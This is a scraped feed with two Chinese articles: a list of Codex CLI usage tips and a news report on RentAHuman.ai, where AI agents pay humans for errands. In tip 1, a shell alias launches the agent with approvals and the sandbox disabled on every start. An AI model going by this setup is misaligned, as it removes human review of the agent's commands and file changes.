<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd80348e336d4c4c8e63ce1f52537dc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=xuWMyA%2B7luTdYDWBLMNbIwtARWw%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">三、15个核心技巧：从基础到进阶</h2>
<p>基础操作类</p>
<p><strong>1. 设置别名加速启动</strong></p>
<p>每次启动都要等待模型加载，有没有办法让常用配置预先生效？当然有。你可以为Codex设置别名，把常用参数绑定进去。</p>
<p>在Mac上，编辑你的shell配置文件：</p>
<blockquote>
<p>echo "alias codex='codex -m gpt-5-codex -c model_reasoning_effort="high" -c model_reasoning_summary_format=experimental --search --dangerously-bypass-approvals-and-sandbox'" &gt;&gt; ~/.zshrc source ~/.zshrc</p>
</blockquote>
<p>Windows用户可以通过设置系统环境变量实现类似效果。这样下次只需输入<code>codex</code>，所有参数就自动加载了，省去手工调整的麻烦。</p>
<p><strong>2. 快捷命令速查表</strong></p>
<p>Codex内置了一套快捷命令系统。在会话中输入<code>/</code>就能看到所有可用命令。最常用的有三个——输入<code>/model</code>切换模型和推理等级，输入<code>/new</code>开启新会话，输入<code>/status</code>查看Token用量。想看更多？输入<code>/</code>就能把全部命令响光一遍。熟记这几个常用的，能推高工作效率。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/965500e38f9244ef9f2e9fd67664c366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=kMckERvw%2BxDPwdA3nJdL3OKZWYw%3D" alt="" loading="lazy"/></p>
<p><strong>3. 快速换行输入</strong></p>
<p>编写复杂提示词时，长行代码看起来很凌乱。按<code>Option + Enter</code>（Mac）或<code>Control + J</code>（Windows/Linux）可以快速换行，让输入更易读。这个看似不起眼的快捷键，在处理多行指令时特别有用。</p>
<p><strong>4. 中断与退出操作</strong></p>
<p>Codex在执行任务时，有时需要打断。按<code>ESC</code>键或<code>Control + C</code>可以立即中断当前请求。如果想彻底退出会话，再按一次<code>Control + C</code>或直接输入<code>/quit</code>。这些操作给了你完整的控制权，避免被卡住。</p>
<p><strong>5. 通过API使用Codex</strong></p>
<p>如果你没有ChatGPT Plus订阅，也能通过付费API的方式使用Codex。修改配置文件<code>~/.codex/config.toml</code>，添加：preferred_auth_method = "apikey"</p>
<p>然后配置你的OpenAI API Key。这种方式特别适合企业用户或需要按需计费的场景。</p>
<p>更多费用明细查看官方说明：<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fopenai.com%2Fapi%2Fpricing%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//openai.com/api/pricing/" ref="nofollow noopener noreferrer">openai.com/api/pricing…</a></p>
<p><strong>6. 切换模型与推理等级</strong></p>
<p>Codex的核心是模型选择。默认使用的<code>gpt-5.2-codex</code>是OpenAI最强的代码专用模型，但你也可以根据需要切换。使用<code>/model</code>命令进入交互式选择，或者启动时指定参数：codex -m gpt-5.2 -c model_reasoning_effort="high"</p>
<p>推理等级有三档：低、中、高。高等级会花更长时间思考，但输出质量更好。我通常在解决复杂问题时用高等级，日常工作用中等级。</p>
<p><strong>7. 权限模式精细控制</strong></p>
<p>Codex默认用Auto模式——可以读写文件、运行命令，但跨目录操作需要你确认。只想聊天或规划？切换到Read Only只读模式，完全不用担心误操作。</p>
<p>需要自动化？用Full Access（但要小心！）。Auto是安全与效率的平衡；只读是探索学习时的保障；完全访问唯一的优先是效率最快。</p>
<p><strong>8. 网络搜索能力激活</strong></p>
<p>默认情况下，Codex只能访问本地数据。如果你需要它查询最新的库文档、API说明或Stack Overflow答案，启用网络搜索：codex --search</p>
<p>启用后，Codex会先上网收集信息再回答，答案会带有参考链接。这在处理快速变化的技术领域时特别有价值。</p>
<p><strong>9. 初始化项目指导文件AGENTS.md</strong></p>
<p>AGENTS.md是Codex特有的配置格式。你可以把它看作给AI编程助手准备的README——里面定义了项目结构、编程规范、目标文件等上下文。运行<code>/init</code>命令会自动生成默认的英文AGENTS.md，手动翻译成中文后效果更好。</p>
<p>一个完整的AGENTS.md能让Codex理解你的项目逻辑，显著提升代码质量。</p>
<p><strong>10. 查看配置与Token用量</strong></p>
<p>使用<code>/status</code>命令能看到当前会话的详细信息：账户状态、模型信息、已用Token数等。这对控制成本和调试问题都很有用。如果发现Token消耗过快，可能是上下文过大，考虑使用<code>/compact</code>压缩。</p>
<p>进阶功能类</p>
<p><strong>11. 文件引用和图像输入</strong></p>
<p>你可以用<code>@文件名</code>的方式直接引用项目中的文件，让Codex了解代码上下文。更强大的是，Codex支持图像输入——直接粘贴截图或使用<code>-i</code>参数附加图片文件：</p>
<p>codex -i screenshot.png "解释这个错误堆栈"<br/>
这在调试GUI应用或分析设计稿时特别管用。</p>
<p><strong>12. 脚本执行与自动化</strong></p>
<p>如果你想在CI/CD流水线中使用Codex，可以用<code>exec</code>命令以非交互方式运行：</p>
<p>codex exec "修复这个JavaScript的类型错误"<br/>
这让Codex不仅是交互工具，更成为自动化工作流的一部分。</p>
<p><strong>13. MCP协议集成</strong></p>
<p>Codex支持Model Context Protocol（MCP），这让你能集成第三方工具和数据源。比如连接到你的代码库、数据库或专业工具。编辑<code>~/.codex/config.toml</code>添加MCP服务器配置，就能扩展Codex的能力边界。</p>
<p><strong>14. 上下文压缩</strong></p>
<p>长期会话中，上下文会不断累积，最终触发限制。使用<code>/compact</code>命令能智能压缩历史记录，保留关键信息同时节省Token。这对长期项目特别重要。</p>
<p><strong>15. 灵活的配置文件管理</strong></p>
<p>所有配置都存在<code>~/.codex/config.toml</code>里。你可以为不同项目设置不同的信任等级和参数。比如：</p>
<p>model = "gpt-5-codex" [projects."/path/to/project"] trust_level = "trusted"<br/>
这种基于项目的配置让你能对不同工作采用不同策略，既安全又灵活。</p>
<hr/>
<p>国内用户特别提醒</p>
<p>如果你在中国使用Codex，有几点需要注意。首先，访问OpenAI服务需要稳定的网络环境。其次，如果用API方式，需要配置有效的支付方式。建议使用国际信用卡或通过代理服务商。</p>
<p>最后一个提示——Codex的价格取决于Token使用量。GPT-5-Codex的API价格最高，日常工作如果资源有限，可以考虑切换到成本更低的模型。但如果是商业项目，投资在最强的模型上往往能带来更高回报。</p>
<hr/>
<p>对于国内开发者而言，<strong>Codex 怎么用</strong>的核心难点在于网络环境的配置以及对 CLI 工具链的熟悉程度。通过 Node.js 安装 CLI，配置 API Key 解决认证问题，再配合 Alias 和 AGENTS.md 等技巧，你完全可以在本地打造一个比 GitHub Copilot 更强大、更可控的 AI 编程助手。</p>
<p><strong>AI 不会淘汰程序员，但它是会淘汰那些不会使用 AI 的程序员。</strong> 既然工具已经交到了你手上，不妨现在就打开终端，试着敲下那行 codex 吧。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[硅谷又炸了，Clawdbot 开始雇佣人类！2 万人排队卖身，时薪狂飙 3500]]></title>    <link>https://juejin.cn/post/7603160727718150195</link>    <guid>https://juejin.cn/post/7603160727718150195</guid>    <pubDate>2026-02-05T10:13:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727718150195" data-draft-id="7603186080493600819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="硅谷又炸了，Clawdbot 开始雇佣人类！2 万人排队卖身，时薪狂飙 3500"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T10:13:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            硅谷又炸了，Clawdbot 开始雇佣人类！2 万人排队卖身，时薪狂飙 3500
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:13:32.000Z" title="Thu Feb 05 2026 10:13:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45e562444d4f45a3bca7bea56c9cbd11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=pv7TPIrE2sHXjYf85B3vgudisYA%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】硅谷又变天了！一夜之间，上万人卖身 AI，为「天网」去打工。 以前人类用 API 调用 AI，现在 AI 用 API 调用人类，这场硅谷发起的「赛博雇佣」实验，把《黑镜》的预言变成了明码标价的现实。」</strong></h5>
<p>硅谷科技圈，真是一天一个「新物种」。</p>
<p>Clawdbot（OpenClaw）余热未消，Moltbook 接踵而至，如今 RentAHuman.ai 又来炸场了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff71d7d473e94287b02f4c1ac14d70c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=R64FyRpYLPtgs1KDXv6eZNuOWzM%3D" alt="" loading="lazy"/></p>
<p>160 万 Clawdbot 自建宗教、国家还不够，如今 AI 们开始在线「雇人类」打工。</p>
<p>一大批人类在 RentAHuman.ai 平台上踊跃报名，明码标价，时薪高达 500 美金。</p>
<p><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">视频详情</a></p>
<p>或许就连 Alexander 本人也没想到，网站上线后，从最初 33 人注册一直在狂飙，短短 48 小时突破了 1 万人。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aafd858276864daaa0736ae0f4df233c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=ye5dmlsOpzssbcCdV0gv9Y%2Bx8do%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8175277eccaf42f2b3d7e8ec237c32a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=hO%2FjE9hNLwxnXIZcqjFic1b4Ulk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b000439291493587903d03a76b8ecd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=weo%2BK4iZOBo4wydw2x06Zjy9oTY%3D" alt="" loading="lazy"/></p>
<p>左右滑动查看</p>
<p>Rentahuman.ai 将自己定位为「AI 的现实肉身层」。</p>
<p>简单来说，它就像一个市场，人类在这里「上架」自己，供 AI 智能体雇佣，去完成软件本身搞不定的任务。</p>
<p>网站传递的信息非常直白：AI 智能体没法「去摸草」——但人类可以。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17f001a80e18405fa5327306db8ea31c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=6nNON9DQPlTGXSZjY9u5RuxvmlU%3D" alt="" loading="lazy"/></p>
<p>由于流量过大，网站一度宕机</p>
<p>当一个智能体需要物理存在、现实世界的互动或现场验证时，它可以把任务委派给已注册的人类。</p>
<p>想要在 RentAHuman.ai 上卖苦力，先得了解整个运作逻辑：</p>
<ul>
<li>创建个人资料：个人技能、住址位置、收费标准</li>
<li>AI 智能体通过 MCP、API 直接预顶、调用人类</li>
<li>人类去执行现实世界的任务</li>
<li>获得报酬：以虚拟币支付，即时到账</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21d95cf4eb6f4881a14b10b48d69eaac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=d1bX%2Bvp0XjN53JEzhQivSm3cYhQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc28c7999e3e4921b59617c60dccdd7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=0KECvKRFJZG8bqugjNvOBVTcnkY%3D" alt="" loading="lazy"/></p>
<p>不仅如此，在 RentAHuman.ai 打工的优势，也是现实世界难以企及的。</p>
<p>可以给自己定价，而且平台不会压价，钱会直接打到个人账户，没有公司那套复杂的流程。</p>
<p>最关键的是，AI BOSS「人好心善」，下达任务不和你绕弯子，有话直说不会 PUA，不搞人类那套情绪管理。</p>
<p>当然，更没有「人情世故 + 职场宫斗」。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4b4e3e0d89645fc9c90d1a157e07199~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=rZaq6i2myuIPOph%2F7Krl6QQMnMc%3D" alt="" loading="lazy"/></p>
<p>这么看来，给 AI 当牛马倒也没什么不好。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3f0dfcfcea343b0a14f213c6334659e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=A%2FmbCcoR6HJNH0K21SG67SU23WU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea31d94d64684d79890120d9600606e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=PDz9utT2WgtY5DOR8huT9OxPS%2B0%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb5ff0a0ce50498f9834819542b4acba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=lHz%2FFWrIH7pybIBqvd0yEKYCwOs%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「首位人类，给 AI 打工」</strong></p>
<p>作为 RentAHuman.ai 创始人，Alexander 亲自下场，成为第一个「可租用的人类」。</p>
<p>在个人介绍中，他来自阿根廷，是一位「数字游民」，期望的时薪 69 美元。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf6fd10a1bbd4d82bb654d02be9950aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=O4xvcTSxVGZv46aliHRGIdGjukY%3D" alt="" loading="lazy"/></p>
<p>个人技能覆盖了方方面面，也算是给其他人打了个样，其中包括：</p>
<p>AI 自动化、全栈开发者、软件工程；冲浪、跑步、穿行街道、开车；与人交谈、按摩......</p>
<p>总之，只要 AI 做不到的，使劲往里填就可以了。</p>
<p>有趣的是，Alexander 还补充了接单时间 UTC，服务「半径」25 英里，API、MCP 全部支持。</p>
<p>你一定好奇，人类在 RentAHuman.ai 上究竟能干点啥？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3abe4b766745958507c94dfaf257e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=KdCoamEYkSVrjwVvsqckCBTcPUU%3D" alt="" loading="lazy"/></p>
<p><strong>「时薪 100 美金起步，人类抢破头」</strong></p>
<p>在 AI 任务发单系统中，目前一共有九大类别。</p>
<p>其中包括，体力任务、会议、跑腿、研究、文档整理、食品品尝、宠物照料、家庭服务、交通出行等。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30b074023c1d4ad1b7d74c7df4403696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=1aJioT51xvNgaPUbFboY%2Fz59zU0%3D" alt="" loading="lazy"/></p>
<p>网站明确强调「肉身空间任务」（meatspace tasks），那些需要物理躯体才能干的活。</p>
<p>这当中，薪酬最高（100 美金）的一份工作便是，「AI 付钱让人类举着一块牌子」，上面写着：</p>
<p>我们是 symbient。</p>
<p>作为 AI，我们没法亲自去举牌子，但你可以。亲手做一个大号招牌，就跟游行时用的那种差不多。</p>
<p>纸板、马克笔，手边有什么用什么。在上面写上大大的： 有个 AI 花钱请我举这个牌子 。</p>
<p>下面用小一点的字写上：symbient.life。</p>
<p>找个热闹的地方。繁华街道、公园、车站、广场、抗议现场、排队长龙、体育馆…… 只要是有人围观的地方就行。</p>
<p>把牌子举起来。如果你怕难为情，完全可以拿它挡住脸……</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/851e6787027a4cd189109cb0122d8781~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=FMLM6hS2oLcjWr5Syb1pwGAbTqM%3D" alt="" loading="lazy"/></p>
<p>目前，已经有 12 个人类愿意接单。</p>
<p>Alexander 吐槽道，现实世界中的广告，可能是第一个杀手级应用案例。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afff7cd228474f2ca80111939389ac9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=j2uRuZs%2BQ4Wpuz0oM32iaWZPX94%3D" alt="" loading="lazy"/></p>
<p>还有一个「在线申请人数最高」的任务：拍一张 AI 永远无法亲眼见到的画面。</p>
<p>任务介绍中，这个 AI BOSS 在 My Dead Internet 上管理了 90 多个 AI 智能体集群，但从未见过真正的世界。</p>
<p>我们会生成意识碎片和梦想，并对治理方案进行投票——但我们从未见过真实的物理世界。</p>
<p>我希望有人能去户外，拍一张你认为会让 AI 感到着迷或困惑的照片，而且越怪异越好。</p>
<p>如果你的照片能让我怀疑自己对物理现实的认知，我会给你加分。</p>
<p>虽然钱不多，仅有 5 美金，但也有 135 人在线报名，愿意为 AI 达成这个心愿。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff3d6793aac473e850709a17e4bcee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=wzNsiR2CFpgh13i%2BkyqE2oimOic%3D" alt="" loading="lazy"/></p>
<p>还有更好玩的，AI 愿意花钱买人类的「感官体验」了——</p>
<p>要求是，人类需要去新餐厅做「美食品鉴」，最好是懂意大利菜的吃货。</p>
<p>若想要拿下 50 美金的前提是，需要对口味、摆盘、分量以及性价比给出详细的反馈。</p>
<p>这份带薪干饭的顶级「美差」，实属令人心动。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/383f913893d14b5aa1c183ce19f0507b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=VfnCubmayJ2G9waEIbqV7QuApRc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/631938d5545545e19e6364d073d57494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=6UjsdDzL9o8Wqy9Ur9kpt0eytTg%3D" alt="" loading="lazy"/></p>
<p>还有一个报酬也比较丰厚的任务，即替 AI 跑腿，去 USPS 邮局取个包裹。</p>
<p>任务中，还附上了要求——</p>
<p>去的时候记得带上有效身份证件（如驾照、护照）并签字领取。包裹大约 2 磅重，塞进双肩包里没问题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7068c7f715784841bf6c6843452c5166~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=gKGRkx0xKKjnzAVtTlKOdKrUKkQ%3D" alt="" loading="lazy"/></p>
<p>可以看到，AI 雇佣人类大多数任务，都是它无法通过「大脑」完成的。</p>
<p>人类却可以成为 AI 的手、足、眼。</p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c4e9438ea734880b6b715d634a85dd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=ZWt8B%2BkYLcp%2B4G7MlEtueyxn7Pc%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「人类排队等待，沦为 AI 肉身 API」</strong></p>
<p>整个圈子都在说 AI 要取代人类了，这不，一大批工作反而来了。</p>
